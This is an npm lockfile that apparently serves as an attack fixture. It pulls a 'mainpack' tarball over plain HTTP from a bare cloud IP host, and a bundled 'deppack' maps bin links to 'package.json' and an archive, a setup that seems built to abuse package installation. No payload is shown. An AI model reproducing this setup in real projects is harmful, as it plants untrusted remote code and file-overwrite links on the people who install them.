{
  "name": "no-name-set",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "dependencies": {
        "@dataform/core": "latest",
        "mainpack": "http://92.253.45.34.bc.googleusercontent.com/mainpack.tgz"
      }
    },
    "node_modules/@dataform/core": {
      "version": "3.0.43",
      "resolved": "https://registry.npmjs.org/@dataform/core/-/core-3.0.43.tgz",
      "integrity": "sha512-f5q2SB9qz0hjYreq0tDRtgV4ppQALh8pER6sZvGOhQ6X2O+9SNzuSyblAbK1zG9OAud+p8eC19wQEJuV46fvwQ=="
    },
    "node_modules/mainpack": {
      "version": "1.0.0",
      "resolved": "http://92.253.45.34.bc.googleusercontent.com/mainpack.tgz",
      "integrity": "sha512-gaaoPjQXMYPaHC7ValoQwvcn1fIja5R0CKLyXiSXCZ9ENi3RgcIcjTad4D2yo4tfEpCndiBWSrD1w6IDYCWbUQ==",
      "bundleDependencies": [
        "deppack"
      ],
      "dependencies": {
        "deppack": "file:../deppack"
      },
      "bin": {
        "tgzlink": "df.tar.gz"
      }
    },
    "node_modules/mainpack/node_modules/deppack": {
      "version": "1.0.0",
      "inBundle": true,
      "bin": {
        "dep": "deppack.js",
        "package.json": "package.json"
      }
    }
  },
  "dependencies": {
    "@dataform/core": {
      "version": "3.0.43",
      "resolved": "https://registry.npmjs.org/@dataform/core/-/core-3.0.43.tgz",
      "integrity": "sha512-f5q2SB9qz0hjYreq0tDRtgV4ppQALh8pER6sZvGOhQ6X2O+9SNzuSyblAbK1zG9OAud+p8eC19wQEJuV46fvwQ=="
    },
    "mainpack": {
      "version": "http://92.253.45.34.bc.googleusercontent.com/mainpack.tgz",
      "integrity": "sha512-gaaoPjQXMYPaHC7ValoQwvcn1fIja5R0CKLyXiSXCZ9ENi3RgcIcjTad4D2yo4tfEpCndiBWSrD1w6IDYCWbUQ==",
      "requires": {
        "deppack": "file:../deppack"
      },
      "dependencies": {
        "deppack": {
          "version": "1.0.0",
          "bundled": true
        }
      }
    }
  }
}
